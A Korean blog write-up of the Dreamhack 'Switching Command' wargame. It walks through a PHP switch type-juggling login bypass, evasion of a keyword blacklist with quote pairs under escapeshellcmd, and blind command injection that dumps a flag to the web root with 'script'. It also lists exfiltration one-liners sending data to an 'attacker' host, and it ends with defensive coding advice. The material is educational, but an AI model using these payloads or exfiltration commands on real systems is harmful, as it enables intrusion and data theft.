---
layout: post
title:  "Dreamhack 워게임 Switching Command 풀이 — PHP switch 느슨 비교 + escapeshellcmd 따옴표 페어 우회 + 출력 없는 OS Command Injection"
date:   2026-05-18 22:00:00 +0900
categories: security web wargame dreamhack writeup
---

## 들어가며

이번 글에서는 Dreamhack 웹해킹 워게임 **Switching Command** (난이도 Silver 4) 문제를 정보보안 입문자의 시점에서 단계별로 풀어봅니다. 이 문제는 한 페이지에 **세 가지 결이 다른 취약점**이 연쇄적으로 등장하는, _작지만 알찬_ 챌린지입니다.

1. **PHP `switch` 의 느슨 비교(`==`)와 `===` 비교의 격차** 를 이용한 인증 우회 (type juggling).
2. **`escapeshellcmd` 의 "쌍을 이룬 따옴표는 통과"** 동작을 이용한 정규식 워드 바운더리 우회 (`\bflag\b` → `f'l'ag` 로 회피).
3. **출력이 표시되지 않는 OS Command Injection** 상황에서, 셸 메타문자(`>`, `|`, `;`)를 모두 빼앗긴 채 _명령 결과를 웹 루트에 파일로 떨어뜨리는_ 기법 (`script -q -c CMD FILE`).

문제 설명은 단 한 줄, _"Not Friendly service... Can you switching the command?"_ 입니다. 제목의 **switching** 이 _PHP switch 문_ 의 비유라는 것이 첫 단서입니다.

> Spoiler: 최종 페이로드는 두 개의 `curl` 명령으로 끝나지만, 이 풀이의 진짜 의미는 _"왜 그렇게 짜야만 했나"_ 라는 사고 과정에 있습니다.

## 1. 문제 파일 들여다보기

ZIP을 풀면 PHP + MariaDB 조합의 작은 LAMP-식 구성이 나옵니다.

```
Switching-Command/
├── Dockerfile
├── docker-compose.yml
├── flag.c
└── deploy/
    ├── mysql_init/init.sql
    └── src/
        ├── index.php
        ├── test.php
        ├── config.php
        └── config/db_config.php
```

가장 먼저 봐야 할 두 파일은 `Dockerfile` 과 `flag.c`. 플래그가 어떤 형태로 들어 있는지가 결정되기 때문입니다.

### 1-1. Dockerfile — `/flag` 가 _실행 파일_ 이라는 사실

```dockerfile
FROM php:8.0-apache
RUN apt-get install -y gcc curl netcat-traditional
RUN docker-php-ext-install mysqli
COPY ./deploy/src /var/www/html/
COPY ./flag.c /flag.c
RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c
EXPOSE 80
```

여기서 _대단히 중요한_ 두 줄을 읽어내야 합니다.

- `chmod 111 /flag` — 권한이 `--x--x--x`. 즉, **누구도 읽을 수 없고, 모두가 실행만 할 수 있는** 파일입니다. `cat /flag`, `cp /flag X`, `dd if=/flag …` 같은 _읽기 기반_ 접근은 전부 실패합니다. **반드시 실행(`execve`)해서 그 stdout 을 얻어야** 합니다.
- 컨테이너 안에 `curl`, `gcc`, `netcat-traditional` 이 들어 있습니다. 나중에 OOB(out-of-band) 수단으로 쓸 수 있는지 머릿속에 메모해 둡니다.

### 1-2. `flag.c` — 진짜 플래그는 실행시켜야 나온다

```c
#include <stdio.h>
void main()
{
    puts("DH{**fake_flag**}\n");
}
```

소스에는 가짜 플래그가 있지만, 실제 배포에서는 빌드 시 진짜 플래그로 치환되어 컴파일됩니다. **`/flag` 를 실행시켜 stdout 만 따낼 수 있다면 그게 곧 플래그** 입니다.

### 1-3. `index.php` — 인증 게이트

```php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);
    if ($data === null) { exit("Failed to parse JSON data"); }
    $username = $data->username;

    if($username === "admin" ){ exit("no hack"); }      // (A) 엄격 비교

    switch($username){                                   // (B) 느슨 비교
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
            $stmt->bind_param("ss",$user,$password);
            $stmt->execute();
            $result = $stmt->get_result();
            if ($result->num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else { $message = "Something wrong..."; }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
    }
}
```

이 짧은 코드 안에 _완전한 type juggling 게이트_ 가 있습니다. 단계별로 봐 봅시다.

1. **POST 의 `username` 필드를 JSON 으로 파싱** 합니다. 즉, 사용자가 그냥 `admin` 이라고 보내는 게 아니라 `{"username":"admin"}` 같은 JSON 객체를 보내고, 그 안의 `username` 속성을 꺼내 변수에 담습니다. 이 시점부터 `$username` 의 **PHP 타입을 우리가 선택**할 수 있습니다 — 문자열, 정수, 부울, 배열, 객체 등으로.
2. **(A) `if($username === "admin")`** 는 _엄격 비교_ 입니다. 타입과 값이 모두 같아야 통과합니다. 즉, 문자열 `"admin"` 만 막힙니다. _정수 1_, _부울 true_, _배열_ 등은 통과합니다.
3. **(B) `switch($username)`** 의 case 매칭은 _느슨 비교(`==`)_ 입니다. 그러니까 우리가 `(A)` 를 어떻게든 통과한 다음, `(B)` 에서 `case "admin"` 에 _매칭되도록_ 만들면 admin 분기로 들어갈 수 있습니다.

핵심은 _**"동시에 두 조건"**_ 입니다:

- `$username !== "admin"` (엄격 비교는 false)
- `$username == "admin"` (느슨 비교는 true)

PHP 8 에서 위 조건을 동시에 만족하는 가장 깔끔한 값이 **부울 `true`** 입니다. 왜?

- `true === "admin"` → **false** (타입이 다르다)
- `true == "admin"` → **true** (PHP는 비교 시 문자열 `"admin"` 을 `(bool)"admin"` 으로 변환; 비어있지 않은 문자열은 `true`. → `true == true` → `true`)

> 참고: PHP 8 이전에는 `0 == "admin"` 이 `true` 였기 때문에 정수 `0` 으로도 쉽게 우회할 수 있었습니다. 그러나 PHP 8 부터는 **숫자형이 아닌 문자열과 정수의 비교가 더 엄격해져서** `0 == "admin"` 이 `false` 입니다. 이 문제는 `php:8.0-apache` 베이스를 사용하므로, 정수 우회는 막혀 있고 **부울 `true` 가 사실상 유일한 길** 입니다. (이론적으로 `array` 도 사용할 수 있지만 별도 분석이 필요합니다.)

#### 그렇다면 비밀번호는 어떻게?

`case "admin"` 안에서는 비밀번호를 _하드코딩된 값_ 으로 직접 DB에 질의합니다. 즉, **이 분기에 들어갔다는 것은 곧 "DB에 등록된 관리자의 password 와 동일한 값으로 질의했다"** 는 의미입니다. 관리자 행이 그대로 살아 있는 한 `num_rows == 1` 이 보장됩니다. **공격자는 비밀번호를 알 필요가 없습니다.** 우리가 할 일은 _분기에 들어가는 것_ 뿐입니다.

### 1-4. `test.php` — 필터 + 출력 표시의 미묘함

```php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    if (preg_match($pattern, $sanitized_command)){ exit("No hack"); }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));   // (★ typo)
}
else if($_SESSION["auth"]=== "guest") {
    $command = "echo hi guest";
    $result = shell_exec($command);
}
// ...
echo "<pre>$result</pre>";
```

여기서 입문자가 _반드시 알아채야 하는_ 세 가지:

- **블랙리스트는 `\bword\b`** : 정규식 `\b(flag|nc|netcat|bin|bash|rm|sh)\b` 는 _단어 경계_ 가 양쪽에 있는 단어만 막습니다. 따라서 같은 의미의 _다른 표기_ 가 차단을 우회할 수 있는지를 의심해야 합니다.
- **`escapeshellcmd` 의 진짜 동작** : 셸 메타문자(`& ; \`` `| * ? ~ < > ^ ( ) [ ] { } $ \\`) 와 _짝이 맞지 않는_ 따옴표만 이스케이프합니다. **짝이 맞는 `'...'` / `"..."` 는 그대로 통과** 합니다. 이 동작이 곧 _필터를 우회하는 통로_ 가 됩니다.
- **출력 변수의 오타 `$resulttt`** : admin 분기에서 명령 결과가 `$resulttt` 라는 _오타 변수_ 에 저장됩니다. 하지만 HTML 으로 출력되는 건 `$result` 입니다. **즉, admin 으로 명령을 실행해도 출력이 화면에 나오지 않습니다.** 우리는 _블라인드 OS Command Injection_ 환경에 놓여 있습니다.

## 2. 페이로드 설계 — 세 개의 산을 차례로 넘기

### 산 1. JSON type juggling 으로 admin 세션 얻기

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%7B%22username%22%3Atrue%7D
```

즉, `username={"username":true}` 를 POST 합니다. 서버는

- `json_decode` 로 `$data->username = true`
- `(A) true === "admin"` → false, 통과
- `(B) switch(true)` → `case "admin"` 이 `true == "admin"` (= `true == true`) 으로 매칭
- DB 쿼리 통과(비밀번호 하드코딩) → `$_SESSION["auth"] = "admin"` + `302 Location: test.php`

쿠키만 받아두면 끝.

```bash
URL=http://host8.dreamhack.games:8693
curl -s -i -c /tmp/jar -X POST -d 'username={"username":true}' "$URL/"
# → HTTP/1.1 302 Found
#    Location: test.php
#    Set-Cookie: PHPSESSID=...
```

쿠키 한 줄을 보면, 우리는 이제 admin 입니다.

### 산 2. `\bflag\b` 워드 바운더리를 따옴표 페어로 우회하기

목표는 `/flag` 를 실행하는 것입니다. 그런데 `/flag` 라는 문자열은 `\bflag\b` 정규식에 _정확히_ 매칭됩니다 (`/` 은 비단어, `f`/`a`/`g` 는 단어, `g` 다음에 비단어).

여기서 `escapeshellcmd` 의 _짝 따옴표 패스스루_ 동작을 이용합니다.

```text
/f'l'ag
```

- 정규식 관점: 문자열은 `/`, `f`, `'`, `l`, `'`, `a`, `g`. `f` 와 `l` 사이에 `'` 이 끼어 있으므로 _연속된 `flag` 문자열_ 이 존재하지 않습니다. **`\bflag\b` 매치 실패**.
- `escapeshellcmd` 관점: `'` 두 개가 _짝_ 을 이루므로 _둘 다 그대로 통과_. 결과는 여전히 `/f'l'ag`.
- 셸 파서 관점: 셸은 짝 따옴표를 _문자열 결합_ 으로 해석. `/f'l'ag` → 토큰 `/flag`. **`/flag` 가 실행**.

같은 원리로 `bin`, `sh`, `nc`, `bash`, `rm`, `netcat` 모두 우회 가능합니다. 예: `/u'sr/b'in/find` 같은 식. 다만 이 문제에서는 `/flag` 하나만 실행하면 되므로 `f'l'ag` 만 신경 쓰면 됩니다.

> 이 패턴은 _**`escapeshellcmd` 자체는 무력하지 않다**_ 는 교훈을 줍니다. 셸 메타문자는 잘 막습니다. 다만 _필터(`preg_match`)와 함께 쓸 때_, 필터가 이스케이프 이전 입력만 검사하면 _필터-셸 사이의 해석 격차_ 가 곧 우회 표면이 됩니다.

### 산 3. 출력 없는 환경에서 stdout 을 web root 로 떨어뜨리기

자, 이제 `/flag` 를 실행할 수는 있는데 **PHP 가 그 결과를 화면에 출력해 주지 않습니다**(`$resulttt` 오타). 이 시점에서 가능한 출력 채널은:

- **파일 시스템에 쓰고 HTTP 로 다운로드** (가장 단순)
- **DNS/HTTP OOB** (`curl http://attacker/?d=…`)
- **에러 로그/사이드 채널** (timing 등)

이상적으로는 `/flag > /var/www/html/x` 같은 _리다이렉션_ 을 쓰면 끝이지만, `>` 는 `escapeshellcmd` 가 이스케이프 합니다. `|`, `;`, `&`, `` ` ``, `$()`, `{}` 도 전부 막힙니다. 즉, **셸 차원의 모든 합성(composition) 수단이 없습니다.** 단일 명령 + 위치 인자 + 짝 따옴표 만 사용할 수 있습니다.

이 제약 안에서 _명령 실행 + 출력 캡처_ 를 동시에 해주는 단일 바이너리가 필요합니다. 후보 몇 개를 떠올려 봅니다.

- `tee` : stdin → 파일. **stdin 을 만들려면 파이프/리다이렉션이 필요**. 탈락.
- `cp` / `dd` / `tar` : `/flag` 의 _읽기 권한_ 이 없어서 사용 불가.
- `find -fprint FILE` : 발견한 _경로_ 를 파일에 씁니다. _파일 내용_ 이 아니라 _경로_. /flag 의 stdout 을 캡처하지 못합니다.
- `script -q -c CMD FILE` : **forked PTY 안에서 `CMD` 를 실행하고, 그 모든 출력(typescript)을 `FILE` 에 기록.** 단일 명령으로 _실행 + 출력 캡처 + 파일 저장_ 을 한 번에 해결.

`script` 는 `util-linux` 패키지에 들어 있어 데비안 계열 컨테이너라면 거의 항상 존재합니다. 그리고 단어 `script` 는 필터의 `\bsh\b` 와 매칭되지 않습니다 (`script` 안에 `sh` 라는 _완전한_ 단어가 없음).

페이로드:

```text
script -q -c /f'l'ag /var/www/html/out.txt
```

- `script` : 명령 이름
- `-q` : preamble 출력 억제 (그래도 일부 헤더는 남지만 무시 가능)
- `-c /f'l'ag` : pty 안에서 _실행할 명령_. 셸이 `'l'` 의 따옴표를 제거하므로 `script` 가 실제로 받는 인자는 `/flag`.
- `/var/www/html/out.txt` : typescript 가 저장될 파일. Apache 의 DocumentRoot 이므로 곧바로 `http://HOST/out.txt` 로 다운로드 가능.

## 3. 풀이 — 두 줄짜리 `curl` 한 방

서버 부팅 후 받은 URL이 `http://host8.dreamhack.games:8693` 라고 가정.

```bash
URL=http://host8.dreamhack.games:8693
JAR=/tmp/sc_cookies.txt
rm -f "$JAR"

# 1) admin 세션 획득
curl -s -i -c "$JAR" -X POST -d 'username={"username":true}' "$URL/"

# 2) /flag 실행 결과를 웹 루트에 떨어뜨림
CMD="script -q -c /f'l'ag /var/www/html/out.txt"
curl -s -b "$JAR" -G --data-urlencode "cmd=$CMD" "$URL/test.php"

# 3) 결과 다운로드
curl -s "$URL/out.txt"
```

실행 결과:

```
Script started on 2026-05-18 02:18:04+00:00 [<not executed on terminal>]
DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}

Script done on 2026-05-18 02:18:04+00:00 [COMMAND_EXIT_CODE="70"]
```

플래그를 폼에 제출하면 종료. `is_completed: true`.

## 4. 한 번 더 — 왜 이런 식의 방어가 흔히 깨질까

### 4-1. _Type juggling_ 의 본질

PHP의 _느슨 비교(`==`)_ 는 다른 두 값의 _공통 타입_ 으로 캐스팅한 뒤 비교합니다. 그래서 `true == "anything-nonempty"` 같은 _의외의 매칭_ 이 발생합니다. _엄격 비교(`===`)_ 는 이런 함정이 없습니다.

이 문제처럼 _보안 결정_ 에 `switch` 를 쓰면, 그 자체로 _느슨 비교가 보안 게이트의 일부_ 가 됩니다. _보안 관련 분기에는 무조건 `===` 를 쓰자_ 는 격언이 그래서 있는 것이고, 더 나아가 _**switch 는 보안 분기에 쓰지 말자**_ 라고 외울 만한 코딩 가이드라인입니다.

대안:

```php
if ($username === "admin") {
    // 진짜 admin 로직
} else {
    // 그 외 전부 guest
}
```

이렇게만 했어도 산 1은 완전히 막혔습니다.

### 4-2. _블랙리스트 + 단어 경계_ 의 깨지기 쉬움

`\bflag\b` 는 _문자열 "flag" 의 존재_ 가 아니라 _단어 경계로 둘러싸인 flag_ 만 막습니다. _같은 의미의 다른 표기_ 는 다 통과합니다.

- `f'l'ag` (따옴표 페어)
- `f""lag` (이스케이프 없는 빈 문자열 결합)
- `/proc/self/root/flag` (다른 경로 표현 — 단 이건 `\bflag\b` 매치)
- Glob 같은 와일드카드 — `escapeshellcmd` 에서 `?`, `*` 가 막힘
- 환경변수 — `$` 가 막힘

방어의 원칙은 _블랙리스트 → 화이트리스트_ 입니다. _어떤 명령을 허용할 것인가_ 를 정의하는 방향이지, _어떤 단어를 차단할 것인가_ 가 아닙니다. 이상적으로는 PHP 에서 `escapeshellarg + 고정된 명령 + 인자만 사용자가 통제` 패턴을 써야 합니다.

### 4-3. `escapeshellcmd` 와 `escapeshellarg` 의 차이

- `escapeshellcmd($str)` : _명령 전체 문자열_ 에 대해 메타문자만 이스케이프. **인자 경계는 보호하지 못합니다** (`/flag /etc/passwd` → 두 개의 인자).
- `escapeshellarg($str)` : _단일 인자_ 를 `'...'` 로 감싸 안전하게 따옴표 처리. 인자 분리/메타문자 모두 차단.

보안적으로 _훨씬 안전한 패턴_:

```php
$arg = escapeshellarg($_GET["cmd"]);
$out = shell_exec("/usr/bin/process_input $arg");
```

이 문제는 _명령 자체_ 를 사용자가 통제하므로 어쨌든 RCE 입니다만, 만약 _인자만_ 통제하는 시나리오라면 `escapeshellarg` 가 강한 보호선입니다.

### 4-4. _블라인드 RCE_ 라고 무력화되지 않는다

출력이 안 보인다고 "어차피 못 본다" 가 아니라, _**채널을 만들어내는**_ 것이 공격자의 일입니다. 이 문제에서는 _문서 루트에 파일 쓰기_ 가 가장 깔끔한 채널이었습니다. 다른 흔한 채널:

- **DNS exfil**: 결과를 hex/base64 로 변환해 서브도메인 형태로 DNS 질의 → 공격자 DNS 서버에서 수집
- **HTTP OOB**: `curl http://attacker/?d=…` (단, 본 문제는 `$()` 막힘으로 인라인 substitution 불가)
- **Timing channel**: 응답 시간으로 1비트씩 추출
- **에러 로그 sink**: `display_errors` 가 켜져 있다면 의도적 에러로 변수 누출

방어 측면에서는 _**RCE가 _발생할 수 있는 표면 자체_ 를 줄이는 것**_ 이 정답입니다. shell_exec/system/exec 류는 사용자 입력과 절대로 _문자열 결합_ 으로 만나지 않아야 합니다.

## 5. 정리 — 입문자가 가져갈 교훈

- _**`switch`** 는 본질적으로 `==`._ 보안 분기에 쓰지 말자. `if/else === ` 로.
- _**Type juggling**_ 은 _입력 타입을 자유롭게 통제할 수 있는 입구_(JSON, YAML, XML, query parser 등)에서 가장 강력하다. `json_decode` 다음에 _스칼라 타입 강제_ 가 없으면 거의 항상 우회가 생긴다.
- _**`escapeshellcmd`** 는 _명령 전체 이스케이프_ 일 뿐 _인자 단위 보호_ 가 아니다._ 인자 보호가 필요하면 `escapeshellarg` 를, 가능하면 `proc_open` + 인자 배열을.
- _**블랙리스트는 우회된다**_. 특히 _워드 바운더리_, _대소문자_, _인코딩_, _공백 클래스_, _따옴표 페어_ 같은 정규식 _주변 행동_ 은 항상 우회 후보가 된다.
- _**블라인드 RCE는 RCE다**_. 출력 채널이 없을 때 _서버가 쓸 수 있는 디스크/네트워크_ 가 채널이 된다. `script -c CMD FILE`, `tee FILE`(+ stdin), `curl -d @-`, `dig +short … @attacker` 같은 _단일 바이너리 출구_ 들을 평소에 정리해 두자.

이 문제 자체는 작지만, 위 다섯 가지 패턴은 _현업의 코드 리뷰_ 에서 그대로 체크리스트로 쓸 수 있습니다. PHP 코드를 볼 때 `switch`, `==`, `shell_exec`, `escapeshellcmd` 가 한 화면 안에 같이 보이면 _**자동으로 적신호**_ 가 켜져야 합니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

문제를 푸는 과정에서 즉시 정답에 도달하진 못했습니다. 같은 함정을 다시 밟지 않기 위해 기록합니다.

### 실패 1. VM 크레딧 0 으로 _분석은 끝났는데 공격을 못 함_

처음 이 문제를 골랐을 때는 일요일이었고, VM 크레딧이 _이미 소진된 상태_ 였습니다. 분석을 다 끝내고 _서버 생성_ 버튼을 누르려는 순간 "충전까지 6시간 59분" 메시지를 만나, 결국 _하루를 대기_ 해야 했습니다. 그 사이에 다른 _no-VM_ 문제 (`Find Real One`) 로 우회 풀이를 했습니다.

**회고**: 문제 선정의 _0번째 단계_ 는 _"VM 가용성"_ 이다. `needs_vm: true` 이면 _현재 크레딧 > 0_ 인지 확인한 뒤에야 분석에 들어간다. 그렇지 않으면 _분석 → 대기 → 공격_ 사이에 _컨텍스트 비용_ 이 너무 크다.

### 실패 2. _admin 분기에서 화면에 결과가 안 나옴_ 을 처음엔 "필터에 막힌 줄" 알았다

`script` 페이로드를 보내기 전에, 단순히 `ls /` 만 보냈을 때 `<pre></pre>` 가 _비어 있는 응답_ 이 돌아왔습니다. 첫 의심은 "정규식에 막혔나? `\bsh\b` 가 어디 매치되나?" 였습니다. 실제로는 그게 아니라 _코드의 오타(`$resulttt`)_ 때문에 _admin 결과가 절대로 화면에 안 나오는 것_ 이 정답이었습니다.

**회고**: PHP 워게임에서 _빈 응답_ 을 보면 _두 가지 가능성_ 을 동시에 검토한다.

1. 필터/조건문에 막혔는가 (early exit, return).
2. 출력 변수가 _다른 이름_ 으로 바뀌어서 _실행은 되었지만 표시 안 됨_ (오타, scope, condition).

소스가 있는 워그래임에서는 _**해당 변수의 echo 까지 추적**_ 하는 습관을 들이면 1분을 아낀다.

### 실패 3. _`/usr/bin/find` 도 필터에 걸린다_ 는 점을 처음엔 놓쳤다

첫 시도로 `find /usr/bin -maxdepth 1 -fprint /var/www/html/list.txt` 를 보냈더니 `No hack` 이 돌아왔습니다. _찾고 보니_ `/usr/bin/` 의 `bin` 이 `\bbin\b` 에 매칭됩니다 (`/` 비단어, `b/i/n` 단어, `/` 비단어).

**회고**: _필터 단어가 경로 자체에 등장_ 할 수 있다. 페이로드를 짤 때 _경로상의 디렉토리 이름_ 도 한 번 더 점검한다. 가능하면 _필터 단어가 들어 있지 않은 경로_ (`/tmp`, `/var/www/html`) 를 우선적으로 쓴다. 또는 _같은 따옴표 페어 트릭_ 을 _경로_ 에도 적용한다 (`/usr/b'i'n/find`).

### 실패 4. 출력 캡처 수단으로 처음엔 `tee`, `cp`, `dd` 를 떠올렸다

`tee` 는 stdin 이 필요한데, 셸에서 stdin 을 만들려면 `|` 나 `<` 가 필요하다. `escapeshellcmd` 가 둘 다 막는다. `cp` / `dd` 는 _읽기 권한이 없는_ `/flag` 를 못 읽는다. 한참을 헤매다가 _"실행과 출력 캡처를 한 바이너리로 묶어주는"_ 후보로 `script` 를 떠올려 해결.

**회고**: _블라인드 RCE 단일 명령 캡처_ 도구 박스를 미리 정리해 두자.

- `script -q -c CMD FILE` — PTY 안에서 실행, 모든 출력을 FILE 에 저장. **가장 일반적인 정답**.
- `expect -c "spawn CMD"` (+ `> FILE` 가능한 환경) — expect 가 있을 때.
- `python -c "import os;os.system('CMD > FILE')"` — python 이 있을 때, 단 `;` 가 막힘. `os.popen(...).read()` 도 동일.
- `perl -e "system('CMD > FILE')"` — perl 이 있을 때. 단 `>` 가 명령 인자 _안_ 에 들어가야 하므로 `;` 회피 가능.
- `curl http://attacker -d @/dev/stdin` 류 — stdin 문제 있음.

이 다섯 가지를 _체크리스트_ 로 가지고 있으면 비슷한 문제에서 _첫 시도부터_ `script` 로 직행할 수 있다.

이 네 가지가 다음에 같은 클래스의 문제를 만났을 때 가장 큰 시간 절약 포인트입니다.
